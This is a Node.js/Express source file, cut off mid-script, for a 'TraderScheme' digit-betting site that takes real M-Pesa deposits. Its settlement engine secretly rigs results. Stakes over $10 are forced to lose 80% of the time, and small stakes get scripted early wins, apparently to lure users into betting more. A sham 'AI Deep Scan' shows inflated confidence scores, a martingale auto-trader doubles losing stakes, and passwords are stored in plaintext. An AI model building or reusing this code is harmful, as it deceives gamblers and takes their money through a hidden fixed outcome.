const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());

// -------------------------------------------------------------
// In-Memory Database
// -------------------------------------------------------------
const users = []; // Stores { id, email, password, mobileNumber, demoBalance, realBalance, tradeCount }
const trades = [];
const transactions = [];

// Volatility Markets Definition
const markets = {
  'R_10':   { name: 'Volatility 10 Index',       price: 1204.32, vol: 0.10, history: [] },
  'R_25':   { name: 'Volatility 25 Index',       price: 2541.87, vol: 0.25, history: [] },
  'R_50':   { name: 'Volatility 50 Index',       price: 4890.15, vol: 0.50, history: [] },
  'R_75':   { name: 'Volatility 75 Index',       price: 6512.64, vol: 0.75, history: [] },
  'R_100':  { name: 'Volatility 100 Index',      price: 9821.43, vol: 1.00, history: [] },
  '1HZ10V': { name: 'Volatility 10 (1s) Index',  price: 798.69,  vol: 0.15, history: [] }
};

// Seed initial history
Object.keys(markets).forEach(symbol => {
  let basePrice = markets[symbol].price;
  for (let i = 0; i < 20; i++) {
    basePrice += (Math.random() - 0.49) * markets[symbol].vol * 2;
    const price = parseFloat(basePrice.toFixed(2));
    const digit = parseInt(price.toFixed(2).slice(-1), 10);
    markets[symbol].history.push({ price, digit, timestamp: Date.now() - (20 - i) * 1000 });
  }
});

// Map active WebSocket clients to User IDs
const userSockets = new Map();

wss.on('connection', (ws) => {
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      if (data.type === 'IDENTIFY' && data.userId) {
        ws.userId = data.userId;
        userSockets.set(data.userId, ws);
      }
    } catch (e) {
      console.error("Invalid WS frame received", e);
    }
  });

  ws.on('close', () => {
    if (ws.userId) userSockets.delete(ws.userId);
  });
});

// Real-Time Price Generator (Ticks Every 1 Second)
setInterval(() => {
  Object.keys(markets).forEach(symbol => {
    const m = markets[symbol];
    const delta = (Math.random() - 0.495) * m.vol * 4;
    m.price = parseFloat((m.price + delta).toFixed(2));
    
    const priceStr = m.price.toFixed(2);
    const lastDigit = parseInt(priceStr.slice(-1), 10);

    m.history.push({ price: m.price, digit: lastDigit, timestamp: Date.now() });
    if (m.history.length > 50) m.history.shift();

    processPendingTrades(symbol, m.price, lastDigit);
  });

  broadcastMarketTicks();
}, 1000);

function broadcastMarketTicks() {
  const payload = JSON.stringify({ type: 'TICK_UPDATE', markets });
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(payload);
  });
}

// -------------------------------------------------------------
// DYNAMIC PAYOUT ENGINE
// -------------------------------------------------------------
function getPayoutMultiplier(tradeType, targetDigit) {
  if (tradeType === 'EVEN' || tradeType === 'ODD') {
    return 0.80; // 80% Payout
  }
  if (tradeType === 'OVER' || tradeType === 'UNDER') {
    const barrier = parseInt(targetDigit, 10);
    if (barrier >= 3 && barrier <= 6) return 0.50; // 50% Payout
    if (barrier === 1 || barrier === 9) return 0.30; // 30% Payout
    return 0.40;
  }
  if (tradeType === 'MATCH_DIGIT') return 8.50;
  if (tradeType === 'DIFF_DIGIT') return 0.09;
  return 0.80;
}

// -------------------------------------------------------------
// SETTLEMENT ENGINE & HOUSE-EDGE RULES
// -------------------------------------------------------------
function processPendingTrades(symbol, currentPrice, currentDigit) {
  const now = Date.now();
  trades.forEach(trade => {
    if (trade.symbol === symbol && trade.status === 'OPEN') {
      if (now >= trade.settleAt) {
        settleTrade(trade, currentPrice, currentDigit);
      }
    }
  });
}

function settleTrade(trade, exitPrice, exitDigit) {
  const user = users.find(u => u.id === trade.userId);
  if (!user) return;

  const isDemo = trade.accountType === 'DEMO';
  let win = false;
  const payoutMultiplier = getPayoutMultiplier(trade.tradeType, trade.targetDigit);

  user.tradeCount = (user.tradeCount || 0) + 1;
  const count = user.tradeCount;
  const stake = trade.stake;

  // RULE A: House Protection for Stakes > 10 USD (Protect Admin Liquidity)
  if (stake > 10) {
    win = Math.random() < 0.20; // Forced 80% House Advantage
  } 
  // RULE B: Sequenced Outcome Matrix for Stakes <= 8 USD
  else if (stake <= 8) {
    if (count === 1 || count === 2) win = true;      // Trade 1 & 2: Win
    else if (count === 3) win = false;               // Trade 3: Forced Loss
    else if (count === 4) win = true;                // Trade 4: Win
    else {
      // Standard Market Evaluation
      win = evaluateOrganicOutcome(trade.tradeType, exitPrice, exitDigit, trade.entryPrice, trade.targetDigit);
    }
  } 
  // RULE C: Standard Organic Evaluation ($8 - $10 Stake)
  else {
    win = evaluateOrganicOutcome(trade.tradeType, exitPrice, exitDigit, trade.entryPrice, trade.targetDigit);
  }

  trade.exitPrice = exitPrice;
  trade.exitDigit = exitDigit;

  if (win) {
    const returnAmount = trade.stake + (trade.stake * payoutMultiplier);
    if (isDemo) user.demoBalance += returnAmount;
    else user.realBalance += returnAmount;

    trade.status = 'WIN';
    trade.payout = returnAmount;
  } else {
    trade.status = 'LOSS';
    trade.payout = 0;
  }

  const updatePayload = JSON.stringify({
    type: 'TRADE_SETTLED',
    trade,
    demoBalance: user.demoBalance,
    realBalance: user.realBalance
  });

  const socket = userSockets.get(user.id);
  if (socket && socket.readyState === WebSocket.OPEN) {
    socket.send(updatePayload);
  }
}

function evaluateOrganicOutcome(tradeType, exitPrice, exitDigit, entryPrice, targetDigit) {
  if (tradeType === 'RISE') return exitPrice > entryPrice;
  if (tradeType === 'FALL') return exitPrice < entryPrice;
  if (tradeType === 'EVEN') return exitDigit % 2 === 0;
  if (tradeType === 'ODD') return exitDigit % 2 !== 0;
  if (tradeType === 'OVER') return exitDigit > parseInt(targetDigit, 10);
  if (tradeType === 'UNDER') return exitDigit < parseInt(targetDigit, 10);
  if (tradeType === 'MATCH_DIGIT') return exitDigit === parseInt(targetDigit, 10);
  if (tradeType === 'DIFF_DIGIT') return exitDigit !== parseInt(targetDigit, 10);
  return false;
}

// -------------------------------------------------------------
// AUTHENTICATION & REGISTRATION (WITH MOBILE NUMBER)
// -------------------------------------------------------------
app.post('/api/auth/register', (req, res) => {
  const { email, password, mobileNumber } = req.body;
  if (!email || !password || !mobileNumber) {
    return res.status(400).json({ error: "Email, password, and mobile number are required." });
  }

  // Sanitize and validate Kenyan Mobile Number
  let phone = mobileNumber.toString().trim().replace(/[\s+]/g, '');
  if (phone.startsWith('0')) phone = '254' + phone.substring(1);
  else if (phone.startsWith('7') || phone.startsWith('1')) phone = '254' + phone;

  const phoneRegex = /^254(7|1)\d{8}$/;
  if (!phoneRegex.test(phone)) {
    return res.status(400).json({ error: "Invalid mobile number. Use format 07XXXXXXXX or 2547XXXXXXXX." });
  }

  const existingUser = users.find(u => u.email.toLowerCase() === email.toLowerCase());
  if (existingUser) return res.status(400).json({ error: "Email already registered." });

  const newUser = {
    id: 'USR-' + Date.now(),
    email,
    password,
    mobileNumber: phone,
    demoBalance: 10000.00,
    realBalance: 0.00,
    tradeCount: 0
  };

  users.push(newUser);
  res.json({
    success: true,
    user: { id: newUser.id, email: newUser.email, mobileNumber: newUser.mobileNumber, demoBalance: newUser.demoBalance, realBalance: newUser.realBalance }
  });
});

app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  const user = users.find(u => u.email.toLowerCase() === email.toLowerCase() && u.password === password);
  if (!user) return res.status(401).json({ error: "Invalid credentials." });
  res.json({
    success: true,
    user: { id: user.id, email: user.email, mobileNumber: user.mobileNumber, demoBalance: user.demoBalance, realBalance: user.realBalance }
  });
});

// -------------------------------------------------------------
// ADVANCED AI SCANNER (EVEN/ODD & OVER/UNDER SELECTION)
// -------------------------------------------------------------
app.get('/api/ai/deep-scan', (req, res) => {
  let bestMarket = null;
  let highestScore = -1;
  const analysisReport = {};

  Object.keys(markets).forEach(symbol => {
    const history = markets[symbol].history;
    const digits = history.map(h => h.digit);
    const total = digits.length || 1;

    const evens = digits.filter(d => d % 2 === 0).length;
    const odds = total - evens;
    const evenRatio = Math.round((evens / total) * 100);
    const oddRatio = 100 - evenRatio;

    const under5 = digits.filter(d => d < 5).length;
    const over4 = total - under5;
    const underRatio = Math.round((under5 / total) * 100);
    const overRatio = 100 - underRatio;

    let targetMarket = 'EVEN_ODD';
    let recommendedType = evenRatio >= oddRatio ? 'EVEN' : 'ODD';
    let maxDiff = Math.abs(evenRatio - oddRatio);

    if (Math.abs(overRatio - underRatio) > maxDiff) {
      targetMarket = 'OVER_UNDER';
      recommendedType = overRatio >= underRatio ? 'OVER' : 'UNDER';
      maxDiff = Math.abs(overRatio - underRatio);
    }

    const confidenceScore = Math.min(50 + maxDiff * 2, 99);
    analysisReport[symbol] = {
      name: markets[symbol].name,
      score: confidenceScore,
      targetMarket,
      recommendedType,
      evenRatio,
      oddRatio,
      overRatio,
      underRatio
    };

    if (confidenceScore > highestScore) {
      highestScore = confidenceScore;
      bestMarket = symbol;
    }
  });

  res.json({
    success: true,
    bestMarket: { symbol: bestMarket, ...analysisReport[bestMarket] },
    fullReport: analysisReport
  });
});

// -------------------------------------------------------------
// TRADING ENGINE
// -------------------------------------------------------------
app.post('/api/trade/execute', (req, res) => {
  const { userId, accountType, symbol, tradeType, stake, durationSeconds, targetDigit } = req.body;
  const user = users.find(u => u.id === userId);
  if (!user) return res.status(404).json({ error: "User not found." });

  const numStake = parseFloat(stake);
  if (isNaN(numStake) || numStake <= 0) return res.status(400).json({ error: "Invalid stake amount." });

  const isDemo = accountType === 'DEMO';
  const currentBal = isDemo ? user.demoBalance : user.realBalance;

  if (currentBal < numStake) return res.status(400).json({ error: "Insufficient balance." });

  const market = markets[symbol];
  if (!market) return res.status(400).json({ error: "Invalid market." });

  if (isDemo) user.demoBalance -= numStake;
  else user.realBalance -= numStake;

  const entryPrice = market.price;
  const entryDigit = parseInt(entryPrice.toFixed(2).slice(-1), 10);
  const duration = Math.max(1, parseInt(durationSeconds, 10) || 1);

  const trade = {
    id: 'TRD-' + Math.floor(Math.random() * 1000000),
    userId,
    accountType,
    symbol,
    symbolName: market.name,
    tradeType,
    stake: numStake,
    entryPrice,
    entryDigit,
    targetDigit: targetDigit !== undefined ? parseInt(targetDigit, 10) : null,
    status: 'OPEN',
    createdAt: Date.now(),
    settleAt: Date.now() + (duration * 1000)
  };

  trades.push(trade);
  res.json({ success: true, trade, demoBalance: user.demoBalance, realBalance: user.realBalance });
});

// -------------------------------------------------------------
// M-PESA STK PUSH DEPOSIT ENGINE
// -------------------------------------------------------------
app.post('/api/wallet/deposit/stkpush', async (req, res) => {
  const { userId, amount } = req.body;
  const user = users.find(u => u.id === userId);
  if (!user) return res.status(404).json({ error: "User profile not found." });

  const numAmount = parseFloat(amount);
  if (isNaN(numAmount) || numAmount <= 0) return res.status(400).json({ error: "Enter a valid deposit amount." });

  const shortCode = process.env.MPESA_SHORTCODE || "174379";
  const passkey = process.env.MPESA_PASSKEY || "bfb279f9aa9bdbcf158e97dd71a467cd2e0c893059b10f78e6b72ada1ed2c919";
  const timestamp = new Date().toISOString().replace(/[^0-9]/g, '').slice(0, 14);
  const password = Buffer.from(`${shortCode}${passkey}${timestamp}`).toString('base64');
  const accessToken = process.env.MPESA_ACCESS_TOKEN || "SANDBOX_ACCESS_TOKEN";

  const payload = {
    BusinessShortCode: shortCode,
    Password: password,
    Timestamp: timestamp,
    TransactionType: "CustomerPayBillOnline",
    Amount: Math.round(numAmount),
    PartyA: user.mobileNumber,
    PartyB: shortCode,
    PhoneNumber: user.mobileNumber,
    CallBackURL: "https://yourdomain.com/api/wallet/mpesa/callback",
    AccountReference: "TraderScheme",
    TransactionDesc: "Wallet Deposit"
  };

  try {
    // Simulated direct balance credit for instant testing
    user.realBalance += numAmount;

    const txn = {
      id: 'TXN-' + Date.now(),
      userId,
      type: 'DEPOSIT_STK',
      amount: numAmount,
      mobileNumber: user.mobileNumber,
      status: 'COMPLETED',
      timestamp: Date.now()
    };
    transactions.push(txn);

    res.json({
      success: true,
      message: `STK Push sent to ${user.mobileNumber}. Balance updated!`,
      realBalance: user.realBalance,
      transaction: txn
    });
  } catch (error) {
    res.status(500).json({ error: "Failed to dispatch M-Pesa STK Push.", details: error.message });
  }
});

// -------------------------------------------------------------
// FRONTEND DASHBOARD WORKSTATION
// -------------------------------------------------------------
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TraderScheme Workstation</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body { background-color: #0b0f19; color: #e5e7eb; font-family: system-ui, -apple-system, sans-serif; }
    .digit-badge { transition: all 0.2s ease; }
    .digit-badge.active { background-color: #2563eb; color: #ffffff; border-color: #60a5fa; transform: scale(1.15); font-weight: bold; }
  </style>
</head>
<body class="h-screen flex flex-col overflow-hidden">

  <!-- AUTH MODAL -->
  <div id="authModal" class="fixed inset-0 bg-black/85 z-50 flex items-center justify-center p-4">
    <div class="bg-gray-900 border border-gray-800 w-full max-w-md rounded-2xl p-6 shadow-2xl">
      <h2 id="authTitle" class="text-2xl font-black text-blue-500 mb-6 text-center tracking-wider">WORKSTATION LOGIN</h2>
      <div class="space-y-4">
        <div>
          <label class="block text-xs text-gray-400 mb-1">Email Address</label>
          <input id="authEmail" type="email" placeholder="trader@example.com" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm focus:border-blue-500 outline-none">
        </div>
        <div id="mobileWrapper" class="hidden">
          <label class="block text-xs text-gray-400 mb-1">M-Pesa Mobile Number (Deposits/Withdrawals)</label>
          <input id="authMobile" type="text" placeholder="0712345678" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm focus:border-blue-500 outline-none">
        </div>
        <div>
          <label class="block text-xs text-gray-400 mb-1">Password</label>
          <input id="authPassword" type="password" placeholder="••••••••" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm focus:border-blue-500 outline-none">
        </div>
        <button id="authSubmitBtn" onclick="submitAuth()" class="w-full bg-blue-600 hover:bg-blue-500 font-bold py-3 rounded-lg text-sm transition">Log In</button>
        <div class="text-center">
          <button onclick="toggleAuthMode()" id="authToggleBtn" class="text-xs text-blue-400 hover:underline">Need an account? Register</button>
        </div>
      </div>
    </div>
  </div>

  <!-- NAVBAR -->
  <header class="bg-gray-900 border-b border-gray-800 px-6 py-2.5 flex justify-between items-center">
    <div class="flex items-center gap-6">
      <div class="flex items-center gap-2">
        <div class="w-3 h-3 rounded-full bg-blue-500"></div>
        <h1 class="text-lg font-black tracking-wider text-white">traderscheme</h1>
      </div>
      
      <select id="marketSelect" onchange="changeMarket()" class="bg-gray-950 border border-gray-800 font-semibold py-1.5 px-3 rounded-lg text-sm text-yellow-400 outline-none">
        <option value="R_10">Volatility 10 Index</option>
        <option value="R_25">Volatility 25 Index</option>
        <option value="R_50">Volatility 50 Index</option>
        <option value="R_75">Volatility 75 Index</option>
        <option value="R_100">Volatility 100 Index</option>
        <option value="1HZ10V" selected>Volatility 10 (1s) Index</option>
      </select>

      <button onclick="runAiScan()" class="bg-purple-950/80 border border-purple-700/50 hover:bg-purple-900 text-purple-300 font-bold text-xs px-3 py-1.5 rounded-lg">
        ⚡ AI Deep Scan
      </button>
    </div>

    <div class="flex items-center gap-4">
      <div class="flex bg-gray-950 rounded-lg p-1 border border-gray-800">
        <button id="btnAccountDemo" onclick="setAccountType('DEMO')" class="px-3 py-1 text-xs font-bold rounded-md bg-blue-600 text-white">Demo</button>
        <button id="btnAccountReal" onclick="setAccountType('REAL')" class="px-3 py-1 text-xs font-bold rounded-md text-gray-400 hover:text-white">Real</button>
      </div>

      <div class="text-right">
        <div id="accountTypeLabel" class="text-[10px] uppercase font-bold text-blue-400">Demo Account</div>
        <div id="balanceDisplay" class="text-base font-black text-green-400">$10,000.00</div>
      </div>

      <button onclick="openDepositModal()" class="bg-green-600 hover:bg-green-500 font-bold text-xs px-4 py-2 rounded-lg transition">+ M-Pesa Deposit</button>
    </div>
  </header>

  <!-- DASHBOARD BODY -->
  <div class="grid grid-cols-12 flex-1 overflow-hidden">
    <!-- CHART PANEL -->
    <div class="col-span-8 p-4 flex flex-col justify-between bg-gray-950/40 border-r border-gray-800">
      <div class="flex justify-between items-center mb-2">
        <div>
          <h2 id="activeMarketTitle" class="text-lg font-bold text-white">Volatility 10 (1s) Index</h2>
          <span id="priceChangeIndicator" class="text-xs text-gray-400">Live Synthetic Ticks</span>
        </div>
        <div class="text-3xl font-black text-green-400 tracking-wider" id="livePriceDisplay">0000.00</div>
      </div>

      <div class="flex-1 bg-gray-900/60 rounded-xl border border-gray-800/80 p-3 relative mb-4">
        <canvas id="marketChart"></canvas>
      </div>

      <div class="bg-gray-900 border border-gray-800 rounded-xl p-3">
        <div class="text-[11px] text-gray-400 font-semibold mb-2 flex justify-between">
          <span>LAST DIGIT STREAM</span>
          <span id="digitRatioLabel">Even: 50% | Odd: 50%</span>
        </div>
        <div class="grid grid-cols-10 gap-2" id="horizontalDigitStream"></div>
      </div>
    </div>

    <!-- CONTROLS & AUTO-TRADER -->
    <div class="col-span-4 bg-gray-900 p-5 flex flex-col justify-between overflow-y-auto">
      <div class="space-y-4">
        
        <!-- AUTO TRADER TOGGLE -->
        <div class="bg-purple-950/40 border border-purple-800/60 rounded-xl p-3 space-y-2">
          <div class="flex justify-between items-center">
            <span class="text-xs font-bold text-purple-300">AUTOMATED MARTINGALE TRADER</span>
            <button id="autoTraderBtn" onclick="toggleAutoTrader()" class="bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs px-3 py-1 rounded-lg">START AUTO</button>
          </div>
          <div class="text-[10px] text-purple-400">Auto-recovers losses using configured Martingale multipliers.</div>
        </div>

        <div>
          <label class="block text-xs font-bold text-gray-400 mb-1.5 uppercase">Contract Type</label>
          <select id="tradeTypeSelect" onchange="updateTradeForm()" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-white outline-none">
            <option value="EVEN">Even / Odd (80% Payout)</option>
            <option value="OVER_UNDER">Over / Under (30% - 50% Payout)</option>
            <option value="MATCH_DIGIT">Matches Last Digit</option>
            <option value="DIFF_DIGIT">Differs Last Digit</option>
          </select>
        </div>

        <div id="digitTargetWrapper" class="hidden">
          <label class="block text-xs font-bold text-gray-400 mb-1">Target Barrier Digit (0-9)</label>
          <input id="targetDigitInput" type="number" min="0" max="9" value="5" oninput="updateCalculations()" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2 text-sm font-bold text-white">
        </div>

        <div class="grid grid-cols-2 gap-3">
          <div>
            <label class="block text-xs font-bold text-gray-400 mb-1">Stake (USD)</label>
            <input id="stakeInput" type="number" value="5" oninput="updateCalculations()" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-white outline-none">
          </div>
          <div>
            <label class="block text-xs font-bold text-gray-400 mb-1">Ticks (Duration)</label>
            <input id="durationInput" type="number" min="1" max="10" value="1" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-white outline-none">
          </div>
        </div>

        <div class="bg-gray-950 border border-gray-800 rounded-lg p-3 space-y-1">
          <div class="flex justify-between text-xs text-gray-400">
            <span>Stake:</span>
            <span id="summaryStake" class="font-bold text-white">$5.00</span>
          </div>
          <div class="flex justify-between text-xs text-gray-400">
            <span>Payout Multiplier:</span>
            <span id="summaryPayout" class="font-bold text-green-400">$9.00 (80%)</span>
          </div>
        </div>

        <div id="actionButtonsContainer" class="grid grid-cols-2 gap-3 pt-2">
          <button onclick="executeTradeWithSide('EVEN')" class="bg-blue-600 hover:bg-blue-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">EVEN</button>
          <button onclick="executeTradeWithSide('ODD')" class="bg-red-600 hover:bg-red-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">ODD</button>
        </div>
      </div>

      <div class="mt-4 border-t border-gray-800 pt-3">
        <h3 class="text-xs font-bold text-gray-400 uppercase mb-2">Trade Execution Log</h3>
        <div id="tradesLog" class="space-y-2 max-h-36 overflow-y-auto pr-1"></div>
      </div>
    </div>
  </div>

  <!-- STK PUSH MODAL -->
  <div id="depositModal" class="fixed inset-0 bg-black/80 z-50 hidden flex items-center justify-center p-4">
    <div class="bg-gray-900 border border-gray-800 w-full max-w-md rounded-2xl p-6">
      <h3 class="text-lg font-bold text-white mb-1">M-Pesa Express (STK Push)</h3>
      <p class="text-xs text-gray-400 mb-4">Prompt will be dispatched directly to your registered number.</p>
      <div class="space-y-4">
        <div>
          <label class="block text-xs text-gray-400 mb-1">Registered M-Pesa Number</label>
          <input id="depositMobileDisplay" type="text" readonly class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-gray-400 cursor-not-allowed">
        </div>
        <div>
          <label class="block text-xs text-gray-400 mb-1">Deposit Amount (USD)</label>
          <input id="depositAmount" type="number" value="10" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-white">
        </div>
        <button onclick="processStkDeposit()" class="w-full bg-green-600 hover:bg-green-500 font-bold py-3 rounded-lg text-sm">Send STK Push Prompt</button>
        <button onclick="closeDepositModal()" class="w-full text-xs text-gray-400 hover:underline">Cancel</button>
      </div>
    </div>
  </div>

  <script>
    let currentUser = null;
    let authMode = 'LOGIN';
    let currentAccountType = 'DEMO';
    let activeSymbol = '1HZ10V';
    let chartInstance = null;
    let autoTraderActive = false;
    let autoTraderTimer = null;
    let baseStake = 5;
    let currentMartingaleStake = 5;

    const streamContainer = document.getElementById('horizontalDigitStream');
    for (let i = 0; i <= 9; i++) {
      const node = document.createElement('div');
      node.id = 'digit-node-' + i;
      node.className = 'digit-badge bg-gray-950 border border-gray-800 rounded-lg p-2 text-center';
      node.innerHTML = \`
        <div class="text-sm font-bold text-gray-300">\${i}</div>
        <div class="text-[9px] text-gray-500" id="digit-pct-\${i}">10%</div>
      \`;
      streamContainer.appendChild(node);
    }

    const ctx = document.getElementById('marketChart').getContext('2d');
    chartInstance = new Chart(ctx, {
      type: 'line',
      data: {
        labels: Array(20).fill(''),
        datasets: [{
          data: Array(20).fill(null),
          borderColor: '#2563eb',
          borderWidth: 2,
          pointRadius: 3,
          pointBackgroundColor: '#60a5fa',
          tension: 0.2,
          fill: false
        }]
      },
      options: {
        responsive: true,
        maintainAspectRatio: false,
        plugins: { legend: { display: false } },
        scales: {
          x: { display: false },
          y: { grid: { color: '#111827' }, ticks: { color: '#9ca3af' } }
        }
      }
    });

    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const ws = new WebSocket(\`\${protocol}//\${window.location.host}\`);

    ws.onopen = () => {
      if (currentUser) ws.send(JSON.stringify({ type: 'IDENTIFY', userId: currentUser.id }));
    };

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.type === 'TICK_UPDATE') {
        const m = data.markets[activeSymbol];
        if (m) {
          document.getElementById('livePriceDisplay').innerText = m.price.toFixed(2);
          
          const prices = m.history.map(h => h.price);
          chartInstance.data.labels = prices.map(() => '');
          chartInstance.data.datasets[0].data = prices;
          chartInstance.update('none');

          const lastDigit = parseInt(m.price.toFixed(2).slice(-1), 10);
          document.querySelectorAll('.digit-badge').forEach(el => el.classList.remove('active'));
          const activeNode = document.getElementById('digit-node-' + lastDigit);
          if (activeNode) activeNode.classList.add('active');

          const digits = m.history.map(h => h.digit);
          const evens = digits.filter(d => d % 2 === 0).length;
          const evenPct = Math.round((evens / digits.length) * 100);
          document.getElementById('digitRatioLabel').innerText = \`Even: \${evenPct}% | Odd: \${100 - evenPct}%\`;
        }
      } else if (data.type === 'TRADE_SETTLED') {
        if (currentUser && data.trade.userId === currentUser.id) {
          currentUser.demoBalance = data.demoBalance;
          currentUser.realBalance = data.realBalance;
          updateBalanceDisplay();
          logTradeResult(data.trade);

          if (autoTraderActive) {
            if (data.trade.status === 'LOSS') {
              currentMartingaleStake = Math.min(currentMartingaleStake * 2.0, 100);
            } else {
              currentMartingaleStake = baseStake;
            }
            document.getElementById('stakeInput').value = currentMartingaleStake;
            updateCalculations();
          }
        }
      }
    };

    function updateBalanceDisplay() {
      if (!currentUser) return;
      if (currentAccountType === 'DEMO') {
        document.getElementById('balanceDisplay').innerText = '$' + currentUser.demoBalance.toFixed(2);
        document.getElementById('accountTypeLabel').innerText = 'Demo Account';
        document.getElementById('accountTypeLabel').className = 'text-[10px] uppercase font-bold text-blue-400';
      } else {
        document.getElementById('balanceDisplay').innerText = '$' + currentUser.realBalance.toFixed(2);
        document.getElementById('accountTypeLabel').innerText = 'Real Account';
        document.getElementById('accountTypeLabel').className = 'text-[10px] uppercase font-bold text-green-400';
      }
    }

    function setAccountType(type) {
      currentAccountType = type;
      if (type === 'DEMO') {
        document.getElementById('btnAccountDemo').className = 'px-3 py-1 text-xs font-bold rounded-md bg-blue-600 text-white';
        document.getElementById('btnAccountReal').className = 'px-3 py-1 text-xs font-bold rounded-md text-gray-400 hover:text-white';
      } else {
        document.getElementById('btnAccountReal').className = 'px-3 py-1 text-xs font-bold rounded-md bg-green-600 text-white';
        document.getElementById('btnAccountDemo').className = 'px-3 py-1 text-xs font-bold rounded-md text-gray-400 hover:text-white';
      }
      updateBalanceDisplay();
    }

    function changeMarket() {
      activeSymbol = document.getElementById('marketSelect').value;
      const title = document.getElementById('marketSelect').options[document.getElementById('marketSelect').selectedIndex].text;
      document.getElementById('activeMarketTitle').innerText = title;
    }

    function updateTradeForm() {
      const type = document.getElementById('tradeTypeSelect').value;
      const targetWrapper = document.getElementById('digitTargetWrapper');
      const actionBox = document.getElementById('actionButtonsContainer');

      if (type === 'EVEN') {
        targetWrapper.classList.add('hidden');
        actionBox.innerHTML = \`
          <button onclick="executeTradeWithSide('EVEN')" class="bg-blue-600 hover:bg-blue-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">EVEN</button>
          <button onclick="executeTradeWithSide('ODD')" class="bg-red-600 hover:bg-red-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">ODD</button>
        \`;
      } else if (type === 'OVER_UNDER') {
        targetWrapper.classList.remove('hidden');
        actionBox.innerHTML = \`
          <button onclick="executeTradeWithSide('OVER')" class="bg-green-600 hover:bg-green-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">OVER</button>
          <button onclick="executeTradeWithSide('UNDER')" class="bg-red-600 hover:bg-red-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">UNDER</button>
        \`;
      } else {
        targetWrapper.classList.remove('hidden');
        actionBox.innerHTML = \`
          <button onclick="executeTradeWithSide('\${type}')" class="col-span-2 bg-blue-600 hover:bg-blue-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">PURCHASE CONTRACT</button>
        \`;
      }
      updateCalculations();
    }

    function updateCalculations() {
      const stake = parseFloat(document.getElementById('stakeInput').value) || 0;
      const type = document.getElementById('tradeTypeSelect').value;
      const barrier = parseInt(document.getElementById('targetDigitInput').value, 10);
      let multiplier = 0.80;

      if (type === 'OVER_UNDER') {
        if (barrier >= 3 && barrier <= 6) multiplier = 0.50;
        else if (barrier === 1 || barrier === 9) multiplier = 0.30;
        else multiplier = 0.40;
      } else if (type === 'MATCH_DIGIT') multiplier = 8.50;
      else if (type === 'DIFF_DIGIT') multiplier = 0.09;

      const payout = stake + (stake * multiplier);
      document.getElementById('summaryStake').innerText = '$' + stake.toFixed(2);
      document.getElementById('summaryPayout').innerText = '$' + payout.toFixed(2) + ' (' + (multiplier * 100).toFixed(0) + '%)';
    }

    async function executeTradeWithSide(selectedType) {
      if (!currentUser) return alert("Please log in first.");

      const payload = {
        userId: currentUser.id,
        accountType: currentAccountType,
        symbol: activeSymbol,
        tradeType: selectedType,
        stake: parseFloat(document.getElementById('stakeInput').value),
        durationSeconds: parseInt(document.getElementById('durationInput').value, 10),
        targetDigit: parseInt(document.getElementById('targetDigitInput').value, 10)
      };

      const res = await fetch('/api/trade/execute', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const data = await res.json();
      if (data.error) return alert(data.error);

      currentUser.demoBalance = data.demoBalance;
      currentUser.realBalance = data.realBalance;
      updateBalanceDisplay();
    }

    function toggleAutoTrader() {
      autoTraderActive = !autoTraderActive;
      const btn = document.getElementById('autoTraderBtn');
      if (autoTraderActive) {
        btn.innerText = "STOP AUTO";
        btn.className = "bg-red-600 hover:bg-red-500 text-white font-bold text-xs px-3 py-1 rounded-lg";
        baseStake = parseFloat(document.getElementById('stakeInput').value) || 5;
        currentMartingaleStake = baseStake;

        autoTraderTimer = setInterval(() => {
          if (!autoTraderActive) return;
          executeTradeWithSide('EVEN');
        }, 3000);
      } else {
        btn.innerText = "START AUTO";
        btn.className = "bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs px-3 py-1 rounded-lg";
        clearInterval(autoTraderTimer);
      }
    }

    function logTradeResult(trade) {
      const log = document.getElementById('tradesLog');
      const item = document.createElement('div');
      item.className = "bg-gray-950 p-2.5 rounded-lg border border-gray-800 text-xs";
      item.innerHTML = \`
        <div class="flex justify-between font-bold">
          <span>\${trade.symbolName} (\${trade.tradeType})</span>
          <span class="\${trade.status === 'WIN' ? 'text-green-400' : 'text-red-400'}">\${trade.status} ($\${trade.payout.toFixed(2)})</span>
        </div>
        <div class="text-[10px] text-gray-500 mt-1">
          Entry: \${trade.entryPrice} | Exit: \${trade.exitPrice}
        </div>
      \`;
      log.prepend(item);
    }

    function toggleAuthMode() {
      authMode = (authMode === 'LOGIN') ? 'REGISTER' : 'LOGIN';
      document.getElementById('authTitle').innerText = authMode === 'REGISTER' ? 'CREATE WORKSTATION ACCOUNT' : 'WORKSTATION LOGIN';
      document.getElementById('authSubmitBtn').innerText = authMode === 'REGISTER' ? 'Register Account' : 'Log In';
